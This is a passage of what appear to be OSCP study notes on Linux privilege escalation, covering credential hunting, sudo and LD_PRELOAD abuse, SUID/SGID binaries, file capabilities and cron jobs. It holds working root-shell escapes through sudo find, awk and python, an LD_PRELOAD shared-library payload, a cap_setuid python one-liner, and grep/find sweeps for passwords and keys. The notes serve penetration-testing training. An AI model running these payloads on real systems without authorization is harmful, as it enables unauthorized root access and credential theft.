+<p>A read-only/noexec/nosuid mount changes which effects are possible. Find another consumer rather than assuming every permission bypasses mount policy.</p>
+<h3 id="10-next-transitions-1">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-library">Control a privileged program's shared-library resolution</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-policy">Change a writable account or privilege-policy file</a>.</p>
+<p><a id="linux-secrets"></a></p>
+<h2 id="recover-credentials-from-linux-user-service-and-process-trails">Recover credentials from Linux user, service and process trails</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#3-hunt-credentials-and-service-trails">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/#linux-scoped-file-hunting">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-2">1. Purpose and result</h3>
+<p>Typed credentials or an explicitly authorized usable session capability.</p>
+<h3 id="2-recognition-clues-2">2. Recognition clues</h3>
+<p>Readable configuration, shell history, environment, process arguments or session sockets.</p>
+<h4 id="find-the-clue-from-your-starting-access-2">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Follow observed application processes and directories into readable configuration, history and environment; prioritize paths tied to actual services.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ps auxww
+history
+find /opt /var/www /srv -maxdepth 3 -type f -readable 2>/dev/null
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Process: APP_SERVICE --config /opt/APP/config.ini
+Readable file: /opt/APP/config.ini
+Setting: database_user=DB_USER; password=PASSWORD
+</code></pre>
+<p><strong>Recognize this detail:</strong> An actual service's readable configuration supplies an identity-labelled secret candidate.</p>
+<p><strong>Still missing before method selection:</strong> Read the named config/history/process artifact and record the user, service and host it belongs to. Classify a recovered password/key, test one matching service context and verify the accepted identity before trying reuse elsewhere.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The secret works in its verified identity/service context: use that access and re-enumerate.</td></tr><tr><td>Ruled out in this context</td><td>The value is a stale example and no longer accepted: reject that credential pairing.</td></tr><tr><td>Inconclusive</td><td>A token-like string without service/account context requires provenance work before reuse.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<h3 id="3-prerequisites-2">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Read access to the artifact; exact account/service context; session/agent access must include a usable live identity.</p>
+<h3 id="4-discover-and-verify-prerequisites-2">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">history
+ps auxww
+env
+find /opt /var/www /srv -maxdepth 3 -type f -readable 2>/dev/null
+</code></pre>
+<h3 id="5-why-it-works-2">5. Why it works</h3>
+<p>Secrets can outlive the operation that created them. Process visibility and readable environment depend on permissions; finding a socket does not prove the right to use the associated session.</p>
+<h3 id="6-execute-and-choose-variants-2">6. Execute and choose variants</h3>
+<pre><code class="language-bash">history 2>/dev/null
+find /home /root -maxdepth 3 -type f \
+  \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \
+     -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \
+  -readable 2>/dev/null
+
+grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \
+  /var/www /opt /srv /etc 2>/dev/null | head -n 200
+</code></pre>
+<p>Inspect process arguments and readable process environment:</p>
+<pre><code class="language-bash">ps auxww
+ps eww -u root 2>/dev/null
+tr '\0' ' ' &#x3C; /proc/PID/cmdline 2>/dev/null; echo
+tr '\0' '\n' &#x3C; /proc/PID/environ 2>/dev/null
+</code></pre>
+<p>Check reusable local sessions/agents only when their sockets are accessible:</p>
+<pre><code class="language-bash">w; who; last -n 20
+env | grep -E 'SSH_AUTH_SOCK|TMUX|STY'
+tmux ls 2>/dev/null
+screen -ls 2>/dev/null
+find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null
+</code></pre>
+<blockquote>
+<p>An agent, tmux/screen or daemon socket needs effective socket access and a useful authenticated/privileged session. Presence alone is not session hijacking.</p>
+</blockquote>
+<blockquote>
+<p><strong>Next:</strong> identify the value's user/service context, validate the smallest relevant transition (<code>su</code>, <code>sudo</code>, SSH or application authentication), then re-enumerate. Use <a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">credential handling</a> for cracking/reuse.</p>
+</blockquote>
+<pre><code class="language-bash">find /home /var/www /opt /srv -type f \
+  \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*.bak' \
+     -o -iname '*.old' -o -iname '*.key' -o -iname '*.pem' \) 2>/dev/null
+
+rg -ni 'password|passwd|token|secret|api[_-]?key|connection(string)?' \
+  /var/www /opt /srv 2>/dev/null
+</code></pre>
+<h3 id="7-worked-example--hypothetical-2">7. Worked example — hypothetical</h3>
+<p>Observation: a service command line contains a database password. Test: identify its service/account scope and validate the source login. Illustrative output: database access works but the same OS username does not. Interpretation: enumerate database rights instead of assuming universal reuse.</p>
+<h3 id="8-verify-the-result-2">8. Verify the result</h3>
+<p>Record source, exact material type and validated identity/service; keep real secrets in private lab records.</p>
+<h3 id="9-failure-and-fallback-2">9. Failure and fallback</h3>
+<p>Stale examples and unrelated tokens are common. A denied process read is a visibility limit, not evidence that no credentials exist elsewhere.</p>
+<h3 id="10-next-transitions-2">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/credentials/#credential-classify">Classify the artifact and its identity context</a>; <a href="/oscp/notes/methods/credentials/#credential-use">Validate known passwords and context-specific reuse</a>; <a href="/oscp/notes/methods/services/#service-mysql">Use MySQL/MariaDB data and file primitives</a>.</p>
+<p><a id="linux-sudo"></a></p>
+<h2 id="use-an-allowed-sudo-operation-to-cross-a-privilege-boundary">Use an allowed sudo operation to cross a privilege boundary</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#4-sudo-parse-the-complete-rule">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-3">1. Purpose and result</h3>
+<p>A verified privileged command, file operation or identity transition.</p>
+<h3 id="2-recognition-clues-3">2. Recognition clues</h3>
+<p>sudo -l grants an operation under a more useful identity.</p>
+<h4 id="find-the-clue-from-your-starting-access-3">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Run the exact sudo policy query from the current user and read run-as identity, executable, arguments and tags.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">sudo -n -l 2>&#x26;1
+sudo -l
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">User USER may run:
+    (root) NOPASSWD: /usr/bin/find
+</code></pre>
+<p><strong>Recognize this detail:</strong> The rule permits that exact program as root; its documented privileged operation becomes a candidate.</p>
+<p><strong>Still missing before method selection:</strong> Read sudo -l: match the run-as user, exact executable and allowed arguments. Check NOPASSWD/password access and NOEXEC/environment restrictions; choose only the GTFOBins operation that the full rule permits, then verify id.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The allowed invocation exposes a useful operation and its effect is verified: choose that sudo method.</td></tr><tr><td>Ruled out in this context</td><td>Only a fixed harmless argument pattern is permitted: reject the unrestricted escape assumption.</td></tr><tr><td>Inconclusive</td><td>A password-required response does not show the rule; obtain the legitimate credential/context before deciding.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<h3 id="3-prerequisites-3">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it.</p>
+<h3 id="4-discover-and-verify-prerequisites-3">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">sudo -n -l 2>&#x26;1
+sudo -l
+</code></pre>
+<h3 id="5-why-it-works-3">5. Why it works</h3>
+<p>Sudo grants a configured operation, not arbitrary root by default. Interpreter escapes, editors, file writers and helpers are different useful primitives whose exact invocation must fit the rule.</p>
+<h3 id="6-execute-and-choose-variants-3">6. Execute and choose variants</h3>
+<pre><code class="language-bash">sudo -n -l 2>&#x26;1
+sudo -l
+sudo --version
+</code></pre>
+<p>Record the run-as identity, password tag, executable path, argument constraints/wildcards and <code>SETENV</code>/<code>NOSETENV</code>/<code>env_keep</code>/<code>secure_path</code>/<code>NOEXEC</code>. Match the exact mode under <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>
+<pre><code class="language-bash">sudo /usr/bin/find . -exec /bin/sh \; -quit
+sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+</code></pre>
+<blockquote>
+<p>Use an example only when the entire rule permits it. Restricted arguments, another path/build, privilege dropping, <code>NOEXEC</code>, a non-root run-as user or MAC policy can invalidate the escape.</p>
+</blockquote>
+<details>
+<summary><strong>Preserved LD_PRELOAD variant</strong></summary>
+<blockquote>
+<p>Requires an explicitly allowed/preserved variable and a dynamically linked allowed program.</p>
+</blockquote>
+<pre><code class="language-bash">sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD'
+</code></pre>
+<pre><code class="language-c">#include &#x3C;stdlib.h>
+#include &#x3C;unistd.h>
+void _init(void) {
+  unsetenv("LD_PRELOAD");
+  setgid(0); setuid(0);
+  system("/bin/sh");
+}
+</code></pre>
+<pre><code class="language-bash">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM
+</code></pre>
+<blockquote>
+<p>Static linking, secure-loader behavior, missing environment permission or MAC denial disproves this route.</p>
+</blockquote>
+</details>
+<h3 id="7-worked-example--hypothetical-3">7. Worked example — hypothetical</h3>
+<p>Observation: the rule permits a specific interpreter as root without restricted arguments. Test: compare its documented privileged mode with the full rule and execute a minimal identity proof. Illustrative output: effective UID 0. Interpretation: verify host context and re-enumerate privileged files.</p>
+<h3 id="8-verify-the-result-3">8. Verify the result</h3>
+<p>Verify the executed run-as identity and effective UID; preserve the matching rule and successful operation.</p>
+<h3 id="9-failure-and-fallback-3">9. Failure and fallback</h3>
+<p>Restricted arguments, another run-as user, privilege dropping, NOEXEC or MAC policy can block the candidate. Evaluate another permitted primitive.</p>
+<h3 id="10-next-transitions-3">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-preload">Load a controlled library through a permitted sudo environment</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-secrets">Recover credentials from Linux user, service and process trails</a>.</p>
+<p><a id="linux-preload"></a></p>
+<h2 id="load-a-controlled-library-through-a-permitted-sudo-environment">Load a controlled library through a permitted sudo environment</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-4">1. Purpose and result</h3>
+<p>Verified privileged library initialization under the permitted run-as identity.</p>
+<h3 id="2-recognition-clues-4">2. Recognition clues</h3>
+<p>A sudo rule explicitly preserves or permits a loader variable.</p>
+<h4 id="find-the-clue-from-your-starting-access-4">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect sudo's environment-related tags/defaults and the exact allowed executable's dynamic-linking evidence.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">sudo -l
+file /ALLOWED/PROGRAM
+readelf -l /ALLOWED/PROGRAM
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">env_keep includes LD_PRELOAD, or applicable SETENV
+Allowed program: dynamically linked
+Run-as: root
+</code></pre>
+<p><strong>Recognize this detail:</strong> Explicit environment permission plus a compatible dynamic consumer suggests a loader-injection candidate.</p>
+<p><strong>Still missing before method selection:</strong> Confirm SETENV or explicit LD_PRELOAD preservation in sudo -l and a dynamically linked allowed program. Use only the permitted environment form; inspect the resulting id rather than assuming the shared library ran as root.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The permitted loader consumes the chosen library and its effect runs under the expected identity: select this route.</td></tr><tr><td>Ruled out in this context</td><td>The binary is static or the variable is sanitized: reject this preload chain.</td></tr><tr><td>Inconclusive</td><td>SETENV alone without compatible consumer/loader evidence leaves the route incomplete.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a>.</p>
+<h3 id="3-prerequisites-4">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Allowed variable setting/preservation, a dynamically linked permitted executable and a loader path that honors it.</p>
+<h3 id="4-discover-and-verify-prerequisites-4">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">sudo -l
+file /ALLOWED/PROGRAM
+readelf -l /ALLOWED/PROGRAM
+</code></pre>
+<h3 id="5-why-it-works-4">5. Why it works</h3>
+<p>LD_PRELOAD inserts a library before normal symbol resolution only when the privileged execution path preserves and honors it. Merely setting the variable in an ordinary shell does not satisfy sudo or secure-loader policy.</p>
+<h3 id="6-execute-and-choose-variants-4">6. Execute and choose variants</h3>
+<details>
+<summary><strong>Preserved LD_PRELOAD variant</strong></summary>
+<blockquote>
+<p>Requires an explicitly allowed/preserved variable and a dynamically linked allowed program.</p>
+</blockquote>
+<pre><code class="language-bash">sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD'
+</code></pre>
+<pre><code class="language-c">#include &#x3C;stdlib.h>
+#include &#x3C;unistd.h>
+void _init(void) {
+  unsetenv("LD_PRELOAD");
+  setgid(0); setuid(0);
+  system("/bin/sh");
+}
+</code></pre>
+<pre><code class="language-bash">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM
+</code></pre>
+<blockquote>
+<p>Static linking, secure-loader behavior, missing environment permission or MAC denial disproves this route.</p>
+</blockquote>
+</details>
+<h3 id="7-worked-example--hypothetical-4">7. Worked example — hypothetical</h3>
+<p>Observation: the rule permits a loader variable for one dynamic program. Test: inspect the exact rule and executable before using the controlled library. Illustrative output: the library's identity proof runs as the run-as user. Interpretation: the loader transition is verified.</p>
+<h3 id="8-verify-the-result-4">8. Verify the result</h3>
+<p>Require the library's actual effect and effective identity; a successful compile alone proves nothing about the loader.</p>
+<h3 id="9-failure-and-fallback-4">9. Failure and fallback</h3>
+<p>Static linking, environment sanitization, secure-execution handling and policy denial break this route.</p>
+<h3 id="10-next-transitions-4">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-library">Control a privileged program's shared-library resolution</a>.</p>
+<p><a id="linux-suid"></a></p>
+<h2 id="use-a-suid-or-sgid-programs-exposed-privileged-primitive">Use a SUID or SGID program's exposed privileged primitive</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#5-suid-sgid-and-capabilities">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-5">1. Purpose and result</h3>
+<p>A verified privileged file operation or effective UID/GID transition.</p>
+<h3 id="2-recognition-clues-5">2. Recognition clues</h3>
+<p>A nonstandard or dangerous privileged executable.</p>
+<h4 id="find-the-clue-from-your-starting-access-5">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inventory privileged-mode files, then focus on custom/nonstandard programs and inspect ownership, mount and documented behavior.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">find / -xdev -type f -perm -4000 -ls 2>/dev/null
+find / -xdev -type f -perm -2000 -ls 2>/dev/null
+file /PATH/TO/BINARY
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">-rwsr-xr-x root root /opt/APP/custom-helper
+-rwxr-sr-x root GROUP /PATH/TO/SGID_HELPER
+</code></pre>
+<p><strong>Recognize this detail:</strong> The s bits identify an execution credential mechanism; nonstandard behavior warrants inspection but is not a vulnerability itself.</p>
+<p><strong>Still missing before method selection:</strong> Run stat on the flagged executable and findmnt -T on its path. Check the SUID owner, nosuid and exact binary behavior; after a permitted operation run id to see whether the elevated effective UID was retained.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The program exposes a permitted privileged read/write/exec operation: choose that exact mode.</td></tr><tr><td>Ruled out in this context</td><td>It drops privilege before the controllable operation or runs on nosuid: reject that assumed transition.</td></tr><tr><td>Inconclusive</td><td>Only the SUID listing is known: inspect its actual behavior and constraints before choosing an escape.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<h3 id="3-prerequisites-5">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Effective SUID/SGID on the relevant mount; a program operation preserves and exposes useful privilege.</p>
+<h3 id="4-discover-and-verify-prerequisites-5">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">find / -xdev -type f -perm -4000 -ls 2>/dev/null
+find / -xdev -type f -perm -2000 -ls 2>/dev/null
+findmnt -T /PATH/TO/BINARY
+</code></pre>
+<h3 id="5-why-it-works-5">5. Why it works</h3>
+<p>The mode bit changes execution credentials, but programs may drop them or constrain operations. A stock SUID listing is not a vulnerability; identify the exact program behavior.</p>
+<h3 id="6-execute-and-choose-variants-5">6. Execute and choose variants</h3>
+<pre><code class="language-bash">find / -xdev -type f -perm -4000 -ls 2>/dev/null
+find / -xdev -type f -perm -2000 -ls 2>/dev/null
+getcap -r / 2>/dev/null
+</code></pre>
+<p>Rank nonstandard/custom paths, unexpected versions, writable binaries/parents and dangerous interpreters. Inspect one candidate:</p>
+<pre><code class="language-bash">namei -l /PATH/TO/BINARY
+stat /PATH/TO/BINARY
+file /PATH/TO/BINARY
+readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
+ldd /PATH/TO/BINARY 2>/dev/null
+strings /PATH/TO/BINARY | head -n 150
+dpkg -S /PATH/TO/BINARY 2>/dev/null
+rpm -qf /PATH/TO/BINARY 2>/dev/null
+</code></pre>
+<blockquote>
+<p>Look for a documented SUID/capability primitive, unsafe relative helper, arbitrary file operation, user-controlled config/plugin or exact vulnerable version. Normal distribution SUID files are not findings by themselves.</p>
+</blockquote>
+<details>
+<summary><strong>Capability interpretation and example</strong></summary>
+<p>High-value capability candidates include <code>cap_setuid</code>, <code>cap_setgid</code>, <code>cap_dac_override</code>, <code>cap_dac_read_search</code>, <code>cap_sys_ptrace</code>, <code>cap_sys_admin</code>, <code>cap_setfcap</code> and <code>cap_sys_module</code>. <code>cap_net_raw</code> is usually not a direct root transition.</p>
+<pre><code class="language-bash">capsh --print 2>/dev/null
+grep '^Cap' /proc/self/status
+</code></pre>
+<p>Only when the exact interpreter has effective <code>cap_setuid</code>:</p>
+<pre><code class="language-bash">/PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+</code></pre>
+<blockquote>
+<p><code>+ep</code> indicates permitted plus the file effective bit. Bounding sets, namespaces, <code>nosuid</code> mounts and program behavior can still change the result.</p>
+</blockquote>
+</details>
+<h3 id="7-worked-example--hypothetical-5">7. Worked example — hypothetical</h3>
+<p>Observation: a custom SUID helper invokes another program by relative name. Test: inspect its call and inherited effective identity. Illustrative output: the helper retains root and resolves through a controlled path. Interpretation: apply the PATH method and verify the final identity.</p>
+<h3 id="8-verify-the-result-5">8. Verify the result</h3>
+<p>Verify effective IDs and the exact privileged operation; a real UID or prompt label alone is insufficient.</p>
+<h3 id="9-failure-and-fallback-5">9. Failure and fallback</h3>
+<p>nosuid, privilege dropping, fixed arguments or MAC policy can invalidate a candidate. Distinguish a file-read primitive from arbitrary execution.</p>
+<h3 id="10-next-transitions-5">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-path">Hijack an unqualified helper through controlled PATH resolution</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-capabilities">Use a file capability that enables a specific privileged operation</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-library">Control a privileged program's shared-library resolution</a>.</p>
+<p><a id="linux-capabilities"></a></p>
+<h2 id="use-a-file-capability-that-enables-a-specific-privileged-operation">Use a file capability that enables a specific privileged operation</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-6">1. Purpose and result</h3>
+<p>The specific privileged operation or identity transition enabled by that capability.</p>
+<h3 id="2-recognition-clues-6">2. Recognition clues</h3>
+<p>An interpreter/helper has an effective high-value capability.</p>
+<h4 id="find-the-clue-from-your-starting-access-6">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Search file capabilities and inspect the exact program plus current namespace/bounding context.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">getcap -r / 2>/dev/null
+capsh --print 2>/dev/null
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">/opt/TOOLS/python3 cap_setuid=ep
+</code></pre>
+<p><strong>Recognize this detail:</strong> The specific interpreter has effective set-UID authority, unlike an ordinary copy of python3 elsewhere.</p>
+<p><strong>Still missing before method selection:</strong> Read getcap for the exact executable, inspect its mount and match the named capability to the program operation. A version or capability name alone does not prove that the program retains a useful effective capability.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The exact capability-backed operation changes the effective identity as expected: select that method.</td></tr><tr><td>Ruled out in this context</td><td>Only cap_net_raw exists for the candidate: reject the assumed general UID-changing route.</td></tr><tr><td>Inconclusive</td><td>A capability name without effective-context/consumer evidence is insufficient.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<h3 id="3-prerequisites-6">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> The exact capability is effective in the execution context; mount/namespace/bounding-set restrictions permit its use.</p>
+<h3 id="4-discover-and-verify-prerequisites-6">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">getcap -r / 2>/dev/null
+capsh --print 2>/dev/null
+grep '^Cap' /proc/self/status
+</code></pre>
+<h3 id="5-why-it-works-6">5. Why it works</h3>
+<p>Capabilities divide root authority into individual powers. cap_setuid and file-read capabilities enable different chains; cap_net_raw is not a general root capability.</p>
+<h3 id="6-execute-and-choose-variants-6">6. Execute and choose variants</h3>
+<details>
+<summary><strong>Capability interpretation and example</strong></summary>
+<p>High-value capability candidates include <code>cap_setuid</code>, <code>cap_setgid</code>, <code>cap_dac_override</code>, <code>cap_dac_read_search</code>, <code>cap_sys_ptrace</code>, <code>cap_sys_admin</code>, <code>cap_setfcap</code> and <code>cap_sys_module</code>. <code>cap_net_raw</code> is usually not a direct root transition.</p>
+<pre><code class="language-bash">capsh --print 2>/dev/null
+grep '^Cap' /proc/self/status
+</code></pre>
+<p>Only when the exact interpreter has effective <code>cap_setuid</code>:</p>
+<pre><code class="language-bash">/PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+</code></pre>
+<blockquote>
+<p><code>+ep</code> indicates permitted plus the file effective bit. Bounding sets, namespaces, <code>nosuid</code> mounts and program behavior can still change the result.</p>
+</blockquote>
+</details>
+<h3 id="7-worked-example--hypothetical-6">7. Worked example — hypothetical</h3>
+<p>Observation: a Python interpreter has effective cap_setuid. Test: confirm its exact executable and context, then use the capability-backed identity operation. Illustrative output: UID 0 is obtained. Interpretation: verify host/namespace and re-enumerate.</p>
+<h3 id="8-verify-the-result-6">8. Verify the result</h3>
+<p>Match the granted capability to the observed effect and effective IDs; do not infer unrelated root powers.</p>
+<h3 id="9-failure-and-fallback-6">9. Failure and fallback</h3>
+<p>nosuid, capability bounding sets, namespaces or a missing effective bit can change behavior. Choose another supported primitive.</p>
+<h3 id="10-next-transitions-6">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-secrets">Recover credentials from Linux user, service and process trails</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-suid">Use a SUID or SGID program's exposed privileged primitive</a>.</p>
+<p><a id="linux-jobs"></a></p>
+<h2 id="control-a-script-binary-or-configuration-consumed-by-a-privileged-jobservice">Control a script, binary or configuration consumed by a privileged job/service</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#6-cron-timers-and-services">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-7">1. Purpose and result</h3>
+<p>Verified execution or a useful file operation under the job/service identity.</p>
+<h3 id="2-recognition-clues-7">2. Recognition clues</h3>
+<p>Root-owned cron, systemd or recurring process activity uses a controllable object.</p>
+<h4 id="find-the-clue-from-your-starting-access-7">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect actual cron/systemd definitions and running processes, then follow their action paths into permission checks.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">cat /etc/crontab
+systemctl list-timers --all
+ps auxww
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">* * * * * root /opt/APP/backup.sh
+Script path: /opt/APP/backup.sh
+</code></pre>
+<p><strong>Recognize this detail:</strong> The schedule explicitly names a privileged consumer and an exact file to inspect.</p>
+<p><strong>Still missing before method selection:</strong> Observe the actual command and UID with pspy or inspect the unit with systemctl cat/show. Run namei -l, stat and getfacl on the consumed path and parents; identify the timer, restart or invocation before changing the file.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The controlled object is consumed at a confirmed privileged trigger: choose the job/service method.</td></tr><tr><td>Ruled out in this context</td><td>The real job runs as the same low user: reject privilege gain through that action.</td></tr><tr><td>Inconclusive</td><td>A stale job file without observed activity/usable trigger leaves execution unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<h3 id="3-prerequisites-7">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger.</p>
+<h3 id="4-discover-and-verify-prerequisites-7">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">cat /etc/crontab
+systemctl list-timers --all
+ps auxww
+</code></pre>
+<h3 id="5-why-it-works-7">5. Why it works</h3>
+<p>Writable scripts and service units become useful only when the privileged consumer actually reads them. A timer schedule and a right to restart a service are different triggers.</p>
